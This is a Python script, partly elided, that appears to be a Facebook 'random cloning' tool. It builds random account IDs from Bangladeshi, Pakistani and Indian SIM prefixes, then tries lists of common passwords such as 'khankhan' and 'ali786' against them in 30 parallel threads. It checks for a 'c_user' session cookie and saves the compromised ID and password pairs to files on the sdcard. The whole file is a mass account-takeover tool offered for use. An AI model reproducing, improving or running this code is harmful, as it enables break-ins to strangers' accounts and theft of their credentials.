...
print('\033[1;97m====================================================') 
NameX =input('\033[1;32m[+]\033[1;32m WHAT IS YOUR NAME \033[1;32m: \033[1;32m')
...
def main():
    ...
    clear()
    print (' \t           \033[1;32m[ \033[1;32mMAIN MENU \033[1;32m]')
    print('\033[1;32m====================================================') 
    print(f"\033[1;32mTODAY DATE \033[1;32m: \033[1;32m{ha}/{bu}/{ta} \033[1;32m=== \033[1;32mTIME \033[1;32m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;32m====================================================') 
    print(f"\033[1;32m[+] \033[1;32mUSERNAME \033[1;32m: \033[1;32m{NameX}")
    print('\033[1;32m====================================================') 
    print(f"\033[1;32m[01] \033[1;32mRANDOM CLONING-[FIRE] ")
    print(f"\033[1;32m[02] \033[1;32mFOLLOW ME ON FACEBOOK")
    print(f"\033[1;32m[00] \033[1;32mEXIT ")
    print('\033[1;32m====================================================') 
    adi = input("\033[1;32m[\033[1;32m!\033[1;32m]\033[1;32m SELECT OPTION \033[1;32m: \033[1;32m")
    if adi in ["1","01"]:
        passx()
    elif adi in ["2","02"]:
        os.system("xdg-open https://www.facebook.com/meri.jan.ummmah")
       ...
       exit()
        ...
        print('\033[1;32mINCORECT OPTION!\3[1;32m')
        main()
...
def passx():
    ...
    print(f"\033[1;32mTODAY DATE \033[1;32m: \033[1;32m{ha}/{bu}/{ta} \033[1;32m=== \033[1;32mTIME \033[1;32m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;32m====================================================') 
    print('              \x1b[97m\033[1;32m[ PASSWORD MENU ]\033[0;m ')
    print('\033[1;32m====================================================') 
    print("\033[1;32m[01] \033[1;32mAUTO PASS 7 DIGITS         \033[1;32m[FASTEST]")
    print("\033[1;32m[02] \033[1;32mAUTO PASS 7 AND 11 DIGITS  \033[1;32m[FAST]")
    print("\033[1;32m[03] \033[1;32mAUTO PASS 7 DIGIT AND KHAN \033[1;32m[FAST]")
    print("\033[1;32m[04] \033[1;32mONLY KHAN PASS             \033[1;32m[SLOWEST]")
    print("\033[1;32m[05] \033[1;32mKHAN & ALI MIX PASS        \033[1;32m[SLOWEST]")
    print("\033[1;32m[06] \033[1;32mKHAN & MALIK MIX PASS      \033[1;32m[SLOWEST]")
    print("\033[1;32m====================================================")
    adi = input("\033[1;32m[\033[1;32m!\033[1;32m]\033[1;32m SELECT PASSWORD METHOD \033[1;32m: \033[1;32m")
    if adi in ["1","01"]:
        pass1()
    elif adi in ["2","02"]:
        pass2()
...
def pass1():
    ...
    print(f"\033[1;32mTODAY DATE \033[1;32m: \033[1;32m{ha}/{bu}/{ta} \033[1;32m=== \033[1;32mTIME \033[1;32m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;32m====================================================') 
    print(f"  \x1b[32m\033[1;32m[ S I M    N E T W O R K    C O D E    M E N U ]\033[0;m")
    print('\033[1;32m====================================================') 
    print(f"\t        \x1b[32m\033[1;32m[ EXAMPLE👇]\033[0;m")
    print('\033[1;32m====================================================') 
    print(f'\033[1;32m[!] \033[1;32mBD SIM CODES  \033[1;32m: \033[1;32m+88017, +88019, +88018, +88016')
    print(f'\033[1;32m[!] \033[1;32mPAK SIM CODES \033[1;32m: \033[1;32m0303, 0302, 0301, 0305')
    print(f'\033[1;32m[!] \033[1;32mIND SIM CODES \033[1;32m: \033[1;32m91930, 91778, 91712 , 91902  ')
    print('\033[1;32m====================================================') 
    code = input('\033[1;32m[\033[1;32m!\033[1;32m]\033[1;32m PUT SIM NETWORK CODE \033[1;32m: \033[1;32m')
    os.system("clear")
    print(logo)
    print(f"\033[1;32mTODAY DATE \033[1;32m: \033[1;32m{ha}/{bu}/{ta} \033[1;32m=== \033[1;32mTIME \033[1;32m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
    print('\033[1;32m====================================================') 
    print(f"          \x1b[32m\033[1;32m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;32m====================================================') 
    limit = int(input('\033[1;32m[+]\033[1;32m EXAMPLE \033[1;32m: \033[1;32m2000, 3000, 5000, 10000, 15000, 20000\n\033[1;32m====================================================\n\033[1;32m[+]\033[1;32m PUT IDS LIMIT \033[1;32m: \033[1;32m'))
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f"\033[1;32mTODAY DATE \033[1;32m: \033[1;32m{ha}/{bu}/{ta} \033[1;32m=== \033[1;32mTIME \033[1;32m 🕛  "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print('\033[1;32m====================================================') 
        print(f"\033[1;32m[+]\033[1;32m USER NAME\033[1;32m                :\033[1;32m "+NameX)
        print(f"\033[1;32m[+]\033[1;32m SIM NETWORK CODE YOU PUT\033[1;32m : \033[1;32m"+code)
        print(f"\033[1;32m[+]\033[1;32m TOTAL IDZ\033[1;32m                : \033[1;32m["+tl+"] ")
        print('\033[1;32m[+]\033[1;32m PASSWORD METHOD\033[1;32m          : \033[1;32m1') 
        print('\033[1;32m====================================================') 
    ...
    print('')
    print('\033[1;32m====================================================') 
    print('\033[1;32m[+]\033[1;32m CLONING COMPLETED\n\033[1;32m[√] \033[1;32mYOUR OK IDS \033[1;32m: \033[1;32m'+str(len(ok))+'\n\033[1;32m[+]\033[1;32m TOTAL CP IDS \033[1;32m: \033[1;32m'+str(len(cp)))
    print('\033[1;32m====================================================') 
    print('\033[1;32m[+]\033[1;32m OK IDS SAVE \033[1;32m: \033[1;32m/sdcard/OK.txt\n\033[1;32m[+]\033[1;32m CP IDS SAVE \033[1;32m: \033[1;32m/sdcard/CP.txt')
    input(f'\033[1;32m[+]\033[1;32m PRESS ENTER TO BACK MENU');os.system("clear");main()
...
def pass2():
    ...
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000, 10000, 15000, 20000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
...
def pass4():
    ...
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000, 10000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
...
def pass5():
    ...
    print(f"          \x1b[97m\033[37;41m[ I D S    L I M I T   M E N U ]\033[0;m")
    print('\033[1;97m====================================================') 
    limit = int(input('\033[1;97m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 5000, 15000, 20000\n\033[1;97m====================================================\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['bangladesh','khankhan','ali786','ali123','ali1122','aliali']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
...
def pass6():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = ['khankhan','malikmalik','malik123','malik12','malik786','bangladesh']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;97m====================================================') 
    print('\033[1;97m[+]\033[1;92m CLONING COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;32m[\033[1;32mSUCCESSFUL\033[1;32m]\033[1;32m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;32m[\033[1;32mSUCCESFUL\033[1;32m]\033[1;32m '+uid+' | '+ps+' ')
                    open('/sdcard/ok.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;32m[ADRIYAN] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
